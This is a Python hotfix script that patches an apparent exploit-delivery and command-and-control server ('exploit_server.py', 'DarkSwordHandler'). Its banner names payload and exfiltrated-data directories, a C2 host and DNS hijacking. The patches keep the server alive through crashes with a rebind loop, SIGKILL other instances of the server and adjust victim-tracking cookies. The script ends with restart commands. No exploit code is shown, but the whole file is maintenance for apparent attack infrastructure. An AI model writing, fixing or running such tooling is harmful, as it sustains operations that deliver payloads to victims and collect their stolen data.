# -*- coding: utf-8 -*-
"""
hotfix15v5.py  FINAL - NO Nested f-string indentation bugs.
ALL indentation via function _S(n) = '    '*n.

Fix targets:
  FIX-A PATCH1 (apply FIRST because at END of file (offset >187k so later patch doesn't change earlier offsets)
      → main() banner block + DS-READY-HF15v5 marker + self-connect probe + infinite while True loop.
  FIX-B PATCH2
      → Banner 上面插 PREFLIGHT-PURGE orphan worker killer (exclude self / nginx / mysqld)
  FIX-C PATCH3
      → do_GET if tpl_slug / log_cid cookie block → expires='' + try/except.
"""
import os, sys, time, shutil, ast, re

def _S(n): return '    '*n   # indent helper: 1 unit = 4 spaces

SELF_FILE = os.path.abspath(__file__)
try:
    with open(SELF_FILE, 'r', encoding='utf-8') as _me:
        ast.parse(_me.read())
    print('[SELF-AST-OK] hotfix15v5 self AST PASS')
except SyntaxError as _e:
    print(f'[SELF-AST-FAIL] L{_e.lineno} off={_e.offset}: {_e.msg}')
    sys.exit(2)

PROJ   = '/www/wwwroot/coruna/server'
ESFILE = os.path.join(PROJ, 'exploit_server.py')
BAKDIR = os.path.join(PROJ, 'bak_v204_hotfix15v5')
os.makedirs(BAKDIR, exist_ok=True)

ts = time.strftime('%Y%m%d%H%M%S')
bak = os.path.join(BAKDIR, f'exploit_server.py.bak-{ts}')
shutil.copy2(ESFILE, bak)
ORIG_SIZE = os.path.getsize(ESFILE)
print(f'[BAK] {bak} (size={ORIG_SIZE})')

with open(ESFILE, 'rb') as f:
    src_bytes = f.read()
ORIG_NL = b'\r\n' if src_bytes.count(b'\r\n') > src_bytes.count(b'\n') * 0.5 else b'\n'
src = src_bytes.decode('utf-8', errors='replace').replace('\r\n', '\n').replace('\r', '\n')
lines = src.split('\n')
print(f'[INFO] NL={ORIG_NL!r} lines={len(lines)} orig_size={len(src)}')

# ────────────────────────────────────────────────────────────────────────
# STEP 1: Find PATCH1 (main() banner block)
#   Strategy: for each occurrence of banner=f""" line (MULTILINE starting with 4+ spaces, check if lines 2..25 contain "EXPLOIT SERVER - READY" + "Access URL:".  Fallback to known L3894.
# ────────────────────────────────────────────────────────────────────────
banner_loc = []
_RE_B = re.compile(r'^(?P<ind>[ \t]{4,})banner\s*=\s*f"""\s*$', re.MULTILINE)
for m in _RE_B.finditer(src):
    L_start = 1 + src[:m.start()].count('\n')
    after25 = src[m.end():m.end()+10000]
    tail25 = '\n'.join(after25.split('\n', 30)[:30])
    hr = bool('EXPLOIT SERVER - READY' in tail25)
    ha = bool('Access URL:' in tail25)
    banner_loc.append({
        'off_start': m.start(),
        'indent_str': m.group('ind'),
        'L': L_start,
        'real': (hr and ha),
    })

print(f'[PATCH1-LOC] banner=f occurrences: {len(banner_loc)}')
for i, meta in enumerate(banner_loc):
    tag = 'REAL-MAIN' if meta['real'] else 'other-docstring'
    yn = 'YES' if meta['real'] else 'NO '
    print(f'  #{i+1} L{meta["L"]} offset={meta["off_start"]} indent_n={len(meta["indent_str"])} EXPLOIT={yn} ACCESS={yn} -> {tag}')

real_ones = [meta for meta in banner_loc if meta['real']]
if not real_ones:
    L_FB = 3894 - 1  # L3894 0-indexed
    print(f'[PATCH1-LOC] fallback L3894: line={lines[L_FB][:80]!r}')
    if not (0 <= L_FB < len(lines)) or ('banner = f"""' not in lines[L_FB]):
        print('[FATAL P1] no real banner found and L3894 not banner'); shutil.copy2(bak, ESFILE); sys.exit(5)
    TI_STR = lines[L_FB][: len(lines[L_FB]) - len(lines[L_FB].lstrip(' '))]
    OFF_FB = sum(len(lines[k]) + 1 for k in range(L_FB))
    SEG_AF = src[OFF_FB:]
    SD_LIST = [s.start() for s in re.finditer(r'server\.shutdown\(\)', SEG_AF)]
    if not SD_LIST: print('[FATAL P1 fallback] no server.shutdown after banner'); shutil.copy2(bak, ESFILE); sys.exit(5)
    NL_A = SEG_AF.find('\n', SD_LIST[-1])
    if NL_A < 0: NL_A = len(SEG_AF)
    P1_START, P1_END = OFF_FB, OFF_FB + NL_A
    TI_N = len(TI_STR)
else:
    last_meta = real_ones[-1]
    P1_START = last_meta['off_start']
    TI_STR = last_meta['indent_str']
    TI_N = len(TI_STR)
    SEG_AF = src[P1_START:]
    SD_LIST = [s.start() for s in re.finditer(r'server\.shutdown\(\)', SEG_AF)]
    if not SD_LIST: print('[FATAL P1] no server.shutdown after banner'); shutil.copy2(bak, ESFILE); sys.exit(5)
    NL_A = SEG_AF.find('\n', SD_LIST[-1])
    if NL_A < 0: NL_A = len(SEG_AF)
    P1_END = P1_START + NL_A

OLD_P1 = src[P1_START:P1_END]
SHOW_L = real_ones[-1]['L'] if real_ones else (L_FB + 1)
print(f'[PATCH1-SELECT] start={P1_START} end={P1_END} len={P1_END-P1_START} TI_n={TI_N} L={SHOW_L}')

# ────────────────────────────────────────────────────────────────────────
# STEP 2: Compose NEW_P1 (uses indent helpers _S(1..6) relative to TI = _S(1) = 4*1=4 sp.
#   BUT TI = len(TI_STR) spaces.  So our T(i) = (1 unit offset by factor TI_N/4.
# ────────────────────────────────────────────────────────────────────────
U = TI_N // 4  # = number of 4-space units for main() body.  Usually U=1 (TI_N=4) or U=2 (TI_N=8)
def T(level):
    return _S(U + (level - 1))

NEW_P1 = ''.join([
T(1), 'banner = f"""\n',
'╔══════════════════════════════════════════════════════════════╗\n',
'║              EXPLOIT SERVER - READY                          ║\n',
'╠══════════════════════════════════════════════════════════════╣\n',
'║  Access URL:     http://{args.host}:{args.port}/\n',
'║                  http://localhost:{args.port}/\n',
'║  C2 DNS hijack:  Internal DNS -> {args.host}:80 (if bound)\n',
'║  Payloads dir:   {PAYLOADS_DIR}\n',
'║  Templates dir:  {TEMPLATES_DIR}\n',
'║  Exfil data dir: {EXFIL_DIR}\n',
'║  Log file:       {LOG_FILE}\n',
'║  DB available:   {DB_AVAILABLE}\n',
'╚══════════════════════════════════════════════════════════════╝\n',
'"""\n',
T(1), 'if C2_HOST:\n',
T(2), 'banner += f"║  C2 Host:        {C2_HOST}\\\\n"\n',
T(1), 'if REDIRECT_URL:\n',
T(2), 'banner += f"║  Redirect URL:   {REDIRECT_URL}\\\\n"\n',
T(1), 'banner += "╚══════════════════════════════════════════════════════════════╝\\\\n"\n',
T(1), 'banner += "\\\\n[!] Press Ctrl+C to stop\\\\n"\n',
T(1), '\n',
T(1), 'print(banner)\n',
T(1), 'startup_log = f"Exploit server started on http://{args.host}:{args.port} | DB={DB_AVAILABLE}"\n',
T(1), 'log_to_file(startup_log)\n',
T(1), 'log_to_file(f"Payloads: {PAYLOADS_DIR}")\n',
T(1), 'log_to_file(f"Exfil dir: {EXFIL_DIR}")\n',
T(1), 'log_to_file(f"Log file: {LOG_FILE}")\n',
T(1), '\n',
T(1), '# v20.4 HOTFIX15v5-R1: marker + self-connect probe + while True infinite serve_forever NO SUICIDE\n',
T(1), 'import socket as _diag_sk, os as _diag_os, sys as _diag_sys, time as _diag_tm\n',
T(1), 'try:\n',
T(2), '_ds_pid = _diag_os.getpid()\n',
T(2), '_ds_ppid = _diag_os.getppid()\n',
T(2), '_ds_pgid = _diag_os.getpgrp() if hasattr(_diag_os, "getpgrp") else -1\n',
T(2), 'print(f"[DS-READY-HF15v5] pid={_ds_pid} ppid={_ds_ppid} pgid={_ds_pgid} port={args.port} -> infinite LOOP", flush=True)\n',
T(2), '_diag_sys.stdout.flush(); _diag_sys.stderr.flush()\n',
T(2), '_s1 = _diag_sk.socket(_diag_sk.AF_INET, _diag_sk.SOCK_STREAM)\n',
T(2), '_rr = _s1.connect_ex(("127.0.0.1", int(args.port)))\n',
T(2), 'print(f"[DS-READY-HF15v5] self-connect_ex 127.0.0.1:{args.port}={_rr} (0=OK)", flush=True)\n',
T(2), '_s1.close()\n',
T(1), 'except Exception as _diag_e:\n',
T(2), 'print(f"[DS-READY-HF15v5] probe err {type(_diag_e).__name__}: {_diag_e}", flush=True)\n',
T(1), '\n',
T(1), '_ds_attempt = 0\n',
T(1), 'while True:\n',
T(2), '_ds_attempt += 1\n',
T(2), 'print(f"[DS-SF-LOOP] attempt={_ds_attempt} -> serve_forever(poll=0.3)", flush=True)\n',
T(2), 'try:\n',
T(3), 'server.serve_forever(poll_interval=0.3)\n',
T(2), 'except KeyboardInterrupt:\n',
T(3), 'stop_msg = "Server stopped by user."\n',
T(3), 'print(f"\\\\n[*] {stop_msg}")\n',
T(3), 'try: log_to_file(stop_msg)\n',
T(3), 'except Exception: pass\n',
T(3), 'try: server.shutdown()\n',
T(3), 'except Exception: pass\n',
T(3), 'break\n',
T(2), 'except SystemExit as _ds_se:\n',
T(3), 'print(f"[DS-SF-EXIT] SystemExit(code={_ds_se.code}) -> propagate", flush=True)\n',
T(3), 'try: log_to_file(f"[DS-SF-EXIT] SystemExit {_ds_se.code}")\n',
T(3), 'except Exception: pass\n',
T(3), 'raise\n',
T(2), 'except BaseException as _ds_sf_e:\n',
T(3), 'import traceback as _ds_tb\n',
T(3), '_ts = _diag_tm.strftime("%Y-%m-%d %H:%M:%S")\n',
T(3), '_msg = f"[DS-CRASH-SF-{_ds_attempt}] [{_ts}] pid={_ds_pid} {type(_ds_sf_e).__name__}: {_ds_sf_e}"\n',
T(3), 'print(_msg, flush=True)\n',
T(3), 'try: log_to_file(_msg)\n',
T(3), 'except Exception: pass\n',
T(3), '_ds_tb.print_exc()\n',
T(3), 'if _ds_attempt >= 5:\n',
T(4), 'print(f"[DS-CRASH-SF] crash {_ds_attempt} times -> SystemExit(88)", flush=True)\n',
T(4), 'raise SystemExit(88)\n',
T(3), 'print(f"[DS-CRASH-SF] 3s retry {_ds_attempt+1}th serve_forever...", flush=True)\n',
T(3), 'try:\n',
T(4), '_diag_tm.sleep(3)\n',
T(3), 'except (KeyboardInterrupt, SystemExit): pass\n',
T(3), 'try: server.shutdown()\n',
T(3), 'except Exception: pass\n',
T(3), 'try: server.server_close()\n',
T(3), 'except Exception: pass\n',
T(3), '_diag_tm.sleep(2)\n',
T(3), 'try:\n',
T(4), 'print(f"[DS-SF-REBIND] attempt {_ds_attempt+1} rebind server...", flush=True)\n',
T(4), 'server = ReusableThreadingHTTPServer((args.host, args.port), DarkSwordHandler)\n',
T(3), 'except Exception as _rebind_e:\n',
T(4), 'print(f"[DS-SF-REBIND] failed: {type(_rebind_e).__name__}: {_rebind_e}", flush=True)\n',
T(4), '_diag_tm.sleep(2)\n',
T(1), 'print(f"[DS-SF-LOOP-END] exit", flush=True)\n',
T(1), 'server.shutdown()\n',
])

# ── LOCAL hotfix15v5 SELF TEST: NEW_P1 AST ok inside mock main()
def _TEST_NEW_P1_SYNTAX():
    mock = (
        'def _mock_main():\n'
        '    import os, time, sys, socket\n'
        '    class _SRV:\n'
        '        def serve_forever(self, poll_interval=0.3): pass\n'
        '        def shutdown(self): pass\n'
        '        def server_close(self): pass\n'
        '    server = _SRV()\n'
        '    args = type("A", (), {"host":"0.0.0.0","port":7070})()\n'
        '    PAYLOADS_DIR=TEMPLATES_DIR=EXFIL_DIR=LOG_FILE="/tmp/x"\n'
        '    DB_AVAILABLE="YES"\n'
        '    C2_HOST=None\n'
        '    REDIRECT_URL=None\n'
        '    def log_to_file(m): pass\n'
        '    ReusableThreadingHTTPServer = None\n'
        '    DarkSwordHandler = None\n'
        + NEW_P1
    )
    try:
        ast.parse(mock); compile(mock, '<newp1>', 'exec')
        print('[PATCH1 NEW_P1 SYNTAX-SELFTEST] OK (units per-line-prefix 4spaces mock)')
    except (SyntaxError, IndentationError) as e:
        print(f'[PATCH1 NEW_P1 SYNTAX-SELFTEST FAIL L{e.lineno} off={e.offset}: {e.msg}')
        mls = mock.split('\n')
        for k in range(max(0,e.lineno-6), min(len(mls), e.lineno+5)):
            print(f'  L{k+1:4d}| {mls[k][:200]}')
        shutil.copy2(bak, ESFILE); sys.exit(60)
_TEST_NEW_P1_SYNTAX()

src = src[:P1_START] + NEW_P1 + src[P1_END:]
print(f'[PATCH1] replaced {len(OLD_P1)} -> {len(NEW_P1)} delta={len(NEW_P1)-len(OLD_P1):+d}')
try:
    ast.parse(src); print('[PATCH1 AST] PASS')
except SyntaxError as e:
    print(f'[PATCH1 AST FAIL L{e.lineno} off={e.offset}: {e.msg}')
    shutil.copy2(bak, ESFILE); sys.exit(6)

# ────────────────────────────────────────────────────────────────────────
# STEP 3: PATCH3 expires block (still original offset invariant because PATCH1 >187k)
# ────────────────────────────────────────────────────────────────────────
_P3 = re.compile(
    r'(?P<ind>[ \t]+)if\s+tpl_slug\s*:\s*\n'
    r'(?P=ind)[ \t]*expires\s*=\s*"Expires="\s*\+\s*.*?86400\)\.strftime.*?GMT"\s*\n'
    r'(?P=ind)[ \t]*self\.send_header\("Set-Cookie",\s*f"tpl=\{urllib\.parse\.quote\(tpl_slug\)\}.*?SameSite=Lax"\)\s*\n'
    r'(?P=ind)[ \t]*#\s*Preserve\s+channel\s+info\s+for\s+legacy\s+Coruna\s*\n'
    r'(?P=ind)[ \t]*if\s+log_cid\s*:\s*\n'
    r'(?P=ind)[ \t]*self\.send_header\("Set-Cookie",\s*f"ds_chid=\{log_cid\};\s*Path=/;\s*\{expires\};\s*SameSite=Lax"\)\s*\n'
    r'(?P=ind)[ \t]*if\s+log_tid\s*:\s*\n'
    r'(?P=ind)[ \t]*self\.send_header\("Set-Cookie",\s*f"ds_tpid=\{log_tid\};\s*Path=/;\s*\{expires\};\s*SameSite=Lax"\)',
    re.DOTALL)
P3_ALL = list(_P3.finditer(src))
print(f'[PATCH3-LOC] tpl_slug + log_cid/log_tid {{expires}} block count={len(P3_ALL)}')
if len(P3_ALL) < 1:
    print('[FATAL P3] zero matches'); shutil.copy2(bak, ESFILE); sys.exit(7)

for idx, m3 in sorted(enumerate(P3_ALL), key=lambda x: -x[1].start()):
    indv = m3.group('ind')
    U3 = max(1, len(indv) // 4)
    def S3(k): return _S(U3 + k - 1)
    P3S, P3E = m3.span()
    NEW_P3 = ''.join([
    S3(1), '# v20.4 HF15v5 PATCH3: expires defaults empty + wrap try/except prevent UnboundLocal err curl(52)\n',
    S3(1), "expires = ''\n",
    S3(1), 'try:\n',
    S3(2), 'if tpl_slug:\n',
    S3(3), 'expires = "Expires=" + __import__("datetime").datetime.utcfromtimestamp(__import__("time").time() + 86400).strftime("%a, %d-%b-%Y %H:%M:%S GMT")\n',
    S3(3), 'self.send_header("Set-Cookie", f"tpl={urllib.parse.quote(tpl_slug)}; Path=/; {expires}; SameSite=Lax")\n',
    S3(2), '# Preserve channel info for legacy Coruna\n',
    S3(2), 'if log_cid:\n',
    S3(3), 'self.send_header("Set-Cookie", f"ds_chid={log_cid}; Path=/; {expires}; SameSite=Lax")\n',
    S3(2), 'if log_tid:\n',
    S3(3), 'self.send_header("Set-Cookie", f"ds_tpid={log_tid}; Path=/; {expires}; SameSite=Lax")\n',
    S3(1), 'except Exception as _hf15_p3_e:\n',
    S3(2), 'try:\n',
    S3(3), 'import admin.common as _ac15\n',
    S3(3), 'if _ac15 and hasattr(_ac15, "log_to_file"):\n',
    S3(4), '_ac15.log_to_file(f"[EXPIRES-FALLBACK] do_GET cookie: {_hf15_p3_e}")\n',
    S3(3), 'else:\n',
    S3(4), 'print(f"[EXPIRES-FALLBACK] do_GET cookie: {_hf15_p3_e}", flush=True)\n',
    S3(2), 'except Exception:\n',
    S3(3), 'pass\n',
    ])
    src = src[:P3S] + NEW_P3 + src[P3E:]
    print(f'[PATCH3 #{idx+1}] off {P3S}:{P3E} len={P3E-P3S} -> {len(NEW_P3)} indent_units={U3}')

try:
    ast.parse(src); print('[PATCH3 AST] PASS')
except SyntaxError as e:
    print(f'[PATCH3 AST FAIL L{e.lineno}: {e.msg}')
    shutil.copy2(bak, ESFILE); sys.exit(8)

# ────────────────────────────────────────────────────────────────────────
# STEP 4: PATCH2 PREFLIGHT-PURGE above banner
# ────────────────────────────────────────────────────────────────────────
_INS = src.find(TI_STR + 'banner = f"""\n╔══════════════════════════════════════════════════════════════╗\n'
                       '║              EXPLOIT SERVER - READY                          ║')
if _INS < 0:
    _ALL = list(re.finditer(re.escape(TI_STR) + r'banner\s*=\s*f"""', src))
    if _ALL: _INS = _ALL[-1].start()
if _INS > 0:
    PURGE = ''.join([
    '\n',
    T(1), '# v20.4 HF15v5-R2: PREFLIGHT-PURGE orphan worker (exclude self / nginx / mysqld)\n',
    T(1), 'try:\n',
    T(2), 'import subprocess as _ds_sp, signal as _ds_sg, os as _ds_os, time as _ds_tm\n',
    T(2), '_my_pid = _ds_os.getpid()\n',
    T(2), 'try:\n',
    T(3), '_ps_out = _ds_sp.run(["pgrep","-af","exploit_server.py"],\n',
    T(3), '                      stdout=_ds_sp.PIPE, stderr=_ds_sp.DEVNULL, timeout=4, check=False).stdout.decode("utf-8","ignore")\n',
    T(2), 'except Exception:\n',
    T(3), '_ps_out = ""\n',
    T(2), '_kp = []\n',
    T(2), 'for _pln in _ps_out.splitlines():\n',
    T(3), 'try:\n',
    T(4), '_parts = _pln.split(None, 1)\n',
    T(4), 'if not _parts: continue\n',
    T(4), '_p = int(_parts[0])\n',
    T(4), 'if _p != _my_pid and _p > 1 and _p != _ds_os.getppid():\n',
    T(5), '_cmd = (_parts[1] if len(_parts) > 1 else "").lower()\n',
    T(5), 'if ("exploit_server" in _cmd) and ("nginx" not in _cmd) and ("mysqld" not in _cmd):\n',
    T(6), '_kp.append(_p)\n',
    T(3), 'except Exception:\n',
    T(4), 'continue\n',
    T(2), 'if _kp:\n',
    T(3), 'print(f"[PREFLIGHT-PURGE] kill orphans PIDs={sorted(_kp)} (self={_my_pid})", flush=True)\n',
    T(3), 'for _p in _kp:\n',
    T(4), 'try: _ds_os.kill(_p, _ds_sg.SIGKILL)\n',
    T(4), 'except Exception: pass\n',
    T(3), '_ds_tm.sleep(1.5)\n',
    T(1), 'except Exception:\n',
    T(2), 'pass\n',
    ])
    src = src[:_INS] + PURGE + src[_INS:]
    print(f'[PATCH2] PURGE inserted @ offset={_INS} len={len(PURGE)}')
    try:
        ast.parse(src); print('[PATCH2 AST] PASS')
    except SyntaxError as e:
        print(f'[PATCH2 AST FAIL L{e.lineno}: {e.msg}')
        shutil.copy2(bak, ESFILE); sys.exit(9)

# ────────────────────────────────────────────────────────────────────────
# FINAL
# ────────────────────────────────────────────────────────────────────────
try:
    ast.parse(src); print('[FINAL AST] PASS')
except SyntaxError as e:
    print(f'[FINAL AST FAIL L{e.lineno} off={e.offset}: {e.msg}')
    fl = src.split('\n')
    for k in range(max(1,e.lineno-4), min(len(fl), e.lineno+4)):
        print(f'  L{k:4d}| {fl[k-1][:180]}')
    shutil.copy2(bak, ESFILE); sys.exit(10)

if ORIG_NL == b'\r\n': fb = src.replace('\n', '\r\n').encode('utf-8')
else: fb = src.encode('utf-8')
with open(ESFILE, 'wb') as f: f.write(fb)
NEW_SIZE = os.path.getsize(ESFILE)
print(f'[WRITE] {ORIG_SIZE} -> {NEW_SIZE} (delta {NEW_SIZE-ORIG_SIZE:+d})')

def gr(p): return sorted(set(1+src[:m.start()].count('\n') for m in re.finditer(p, src)))
print('[VERIFY] DS-READY-HF15v5  L=', gr(r'DS-READY-HF15v5'))
print('[VERIFY] DS-SF-LOOP        L=', gr(r'DS-SF-LOOP'))
print('[VERIFY] PREFLIGHT-PURGE   L=', gr(r'PREFLIGHT-PURGE'))
print('[VERIFY] EXPIRES-FALLBACK  L=', gr(r'EXPIRES-FALLBACK'))
print('[VERIFY] self-connect_ex=0 L=', gr(r'self-connect_ex.*=\s*0'))
print('[VERIFY] UnboundLocalError count in exploit_server final =',
      sum(1 for m in re.finditer(r'ds_chid=\{log_cid\}; Path=/; \{expires\}', src)
      if not re.search(r'expires\s*=\s*[\'"]{2}', src[max(0,m.start()-800):m.start()])))
print('✅ HF15v5 APPLY DONE')
print()
print('RUN next:')
print('  /www/server/panel/pyenv/bin/supervisorctl stop coruna_exploit:coruna_exploit_00')
print('  pkill -9 -f exploit_server.py ; sleep 2')
print('  export DS_SKIP_PREFLIGHT_SETSID=1')
print('  cd /www/wwwroot/coruna/server')
print('  nohup /www/server/pyporject_evn/versions/3.12.13/bin/python3 -u exploit_server.py',
      '-H 0.0.0.0 -p 7070 --no-port-80 > /tmp/exploit_server.log 2>&1 &')
print('  sleep 10 ; echo PID=$!')
